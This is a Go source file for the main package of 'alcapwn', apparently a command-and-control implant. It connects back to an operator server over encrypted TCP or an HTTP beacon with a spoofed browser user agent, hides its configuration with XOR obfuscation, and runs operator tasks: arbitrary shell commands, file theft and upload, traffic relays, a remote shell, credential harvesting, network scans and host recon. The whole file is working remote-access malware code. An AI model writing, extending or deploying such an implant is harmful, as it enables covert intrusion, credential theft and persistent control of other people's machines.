// Package main is the alcapwn agent binary.
//
// Build-time configuration is injected via -ldflags:
//
//	go build -ldflags "-s -w \
//	    -X main.lhost=10.0.0.1 \
//	    -X main.lport=4444 \
//	    -X main.interval=60 \
//	    -X main.jitter=20 \
//	    -X main.transport=tcp \
//	    -X main.serverFingerprint=<sha256-hex>" \
//	    ./agent/
//
// Supported transports:
//
//	tcp  — persistent X25519+AES-256-GCM encrypted TCP connection (default)
//	http — HTTP beacon polling: POST /register then GET|POST /beacon/{token}
//
// On any error the agent sleeps interval±jitter seconds and reconnects.
package main

import (
	"fmt"
	"math/rand"
	"os"
	"os/exec"
	"os/user"
	"runtime"
	"strings"
	"time"

	"alcapwn/proto"
)

// Build-time variables — overridden with -ldflags at generate time.
var (
	lhost             = "127.0.0.1"
	lport             = "443"
	interval          = "60"
	jitter            = "20"
	transport         = "tcp" // "tcp" or "http"
	serverFingerprint = ""    // leave empty to skip pinning (dev/test only)

	// HTTP transport customisation — set via 'generate --http-ua / --http-*-path'.
	httpUA           = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
	httpRegisterPath = "/register"
	httpBeaconPath   = "/beacon/"

	// Obfuscated variants — set by 'generate --obfuscate'.
	// When present these override the plain vars above.
	xorKey               = ""
	lhostEnc             = ""
	lportEnc             = ""
	intervalEnc          = ""
	jitterEnc            = ""
	transportEnc         = ""
	serverFingerprintEnc = ""
)

const agentVersion = "v3"

func main() {
	// Resolve obfuscated config vars if enc variants are present.
	// This overwrites the plain ldflags vars so all downstream code is unaffected.
	lhost = resolveVar(lhost, lhostEnc, xorKey)
	lport = resolveVar(lport, lportEnc, xorKey)
	interval = resolveVar(interval, intervalEnc, xorKey)
	jitter = resolveVar(jitter, jitterEnc, xorKey)
	transport = resolveVar(transport, transportEnc, xorKey)
	serverFingerprint = resolveVar(serverFingerprint, serverFingerprintEnc, xorKey)

	h := buildHello()
	ivSec := parseInt(interval, 60)
	jitPct := parseInt(jitter, 20)

	for {
		t := buildTransport(ivSec, jitPct)
		if err := runWithTransport(t, h); err != nil && isDebug() {
			fmt.Fprintf(os.Stderr, "[alcapwn-agent] session error: %v\n", err)
		}
		t.Close()
		jitteredSleep(ivSec, jitPct)
	}
}

// buildTransport returns a Transport implementation for the configured transport var.
func buildTransport(ivSec, jitPct int) Transport {
	if transport == "http" {
		return newHTTPTransport(ivSec, jitPct)
	}
	return newTCPTransport()
}

// runWithTransport completes one full connect→task-loop cycle.
// Returns the first error that terminates the cycle.
func runWithTransport(t Transport, hello proto.Hello) error {
	if err := t.Connect(hello); err != nil {
		return err
	}
	for {
		task, err := t.PollTask()
		if err != nil {
			return err
		}
		res := executeTask(*task)
		if err := t.SendResult(res); err != nil {
			return err
		}
	}
}

// systemShell is the path of the first usable shell found on the target,
// detected once at startup.  Empty means none was found and MiniExec is used.
var systemShell = detectShell()

// detectShell returns the first executable shell found on the target.
func detectShell() string {
	candidates := []string{
		os.Getenv("SHELL"),
		"/bin/bash",
		"/bin/sh",
		"/bin/dash",
		"/usr/bin/bash",
		"/usr/bin/sh",
		"/usr/bin/env sh",
		"/busybox",
	}
	for _, s := range candidates {
		if s == "" {
			continue
		}
		if _, err := os.Stat(strings.Fields(s)[0]); err == nil {
			return s
		}
	}
	return ""
}

// buildHello constructs the agent's identity payload sent on every connect.
func buildHello() proto.Hello {
	hostname, _ := os.Hostname()
	uid := ""
	username := ""
	if u, err := user.Current(); err == nil {
		uid = u.Uid
		username = u.Username
	}
	return proto.Hello{
		Version:   agentVersion,
		MachineID: machineID(),
		Hostname:  hostname,
		OS:        runtime.GOOS,
		Arch:      runtime.GOARCH,
		User:      username,
		UID:       uid,
		Shell:     systemShell,
	}
}

// executeTask runs a single Task and returns its Result.
func executeTask(task proto.Task) proto.Result {
	res := proto.Result{TaskID: task.ID}

	switch task.Kind {
	case proto.TaskExec:
		out, err := runShell(task.Command)
		res.Output = out
		if err != nil {
			if ee, ok := err.(*exec.ExitError); ok {
				res.Exit = ee.ExitCode()
			} else {
				res.Error = err.Error()
			}
		}

	case proto.TaskDownload:
		fi, err := os.Stat(task.Path)
		if err != nil {
			res.Error = err.Error()
			break
		}
		if fi.Size() > proto.MaxBodySize {
			res.Error = fmt.Sprintf("file too large: %d bytes (max %d)", fi.Size(), proto.MaxBodySize)
			break
		}
		data, err := os.ReadFile(task.Path)
		if err != nil {
			res.Error = err.Error()
		} else {
			res.Output = data
		}

	case proto.TaskUpload:
		if err := os.WriteFile(task.Path, task.Data, 0644); err != nil {
			res.Error = err.Error()
		}

	case proto.TaskSOCKS5:
		// SOCKS5 proxy is now handled server-side; agent only needs TaskForward.
		res.Error = "socks5 task not used in this protocol version; use TaskForward"

	case proto.TaskForward:
		// Target: "host:port" to dial; Relay: C2 relay address to connect back to.
		// We proxy data bidirectionally between the two connections.
		if task.Target == "" {
			res.Error = "forward: target required (host:port)"
		} else if task.Relay == "" {
			res.Error = "forward: relay address required"
		} else {
			if err := runRelay(task.Target, task.Relay); err != nil {
				res.Error = err.Error()
			}
		}

	case proto.TaskShell:
		if task.Relay == "" {
			res.Error = "shell: relay address required"
		} else {
			if err := runShellRelay(task.Relay); err != nil {
				res.Error = err.Error()
			}
		}

	case proto.TaskCreds:
		out, err := harvestCreds()
		if err != nil {
			res.Error = err.Error()
		} else {
			res.Output = out
		}

	case proto.TaskScan:
		if task.Target == "" {
			res.Error = "scan: target CIDR required"
		} else {
			data, err := runNetScan(task.Target, task.Ports, task.TimeoutMs)
			if err != nil {
				res.Error = err.Error()
			} else {
				res.Output = data
			}
		}

	case proto.TaskRecon:
		// Run OS-specific recon and return structured JSON
		if runtime.GOOS == "windows" {
			data, err := runWindowsRecon()
			if err != nil {
				res.Error = fmt.Sprintf("windows recon: %v", err)
			} else {
				res.Output = data
			}
		} else {
			// Linux/Unix: run the bash recon script via runShell
			// This mirrors what PTY sessions do - run the full bash recon
			out, err := runShell("id; hostname; uname -a; cat /etc/os-release 2>/dev/null | head -5")
			if err != nil {
				res.Error = fmt.Sprintf("recon: %v", err)
			} else {
				res.Output = out
			}
		}

	default:
		res.Error = fmt.Sprintf("unknown task kind: %s", task.Kind)
	}

	return res
}

// runShell executes command via the system shell, falling back to the
// built-in MiniExec when no system shell is present on the target.
func runShell(command string) ([]byte, error) {
	if systemShell != "" {
		parts := strings.Fields(systemShell)
		bin, args := parts[0], append(parts[1:], "-c", command)
		return exec.Command(bin, args...).CombinedOutput()
	}
	return MiniExec(command)
}

// jitteredSleep sleeps for intervalSec plus up to jitterPct% additional time.
func jitteredSleep(intervalSec, jitterPct int) {
	base := time.Duration(intervalSec) * time.Second
	if jitterPct > 0 {
		maxJitter := int64(float64(base) * float64(jitterPct) / 100.0)
		if maxJitter > 0 {
			base += time.Duration(rand.Int63n(maxJitter))
		}
	}
	time.Sleep(base)
}

func parseInt(s string, def int) int {
	var v int
	if n, _ := fmt.Sscan(s, &v); n == 1 && v > 0 {
		return v
	}
	return def
}

func isDebug() bool {
	return os.Getenv("ALCAPWN_DEBUG") == "1"
}
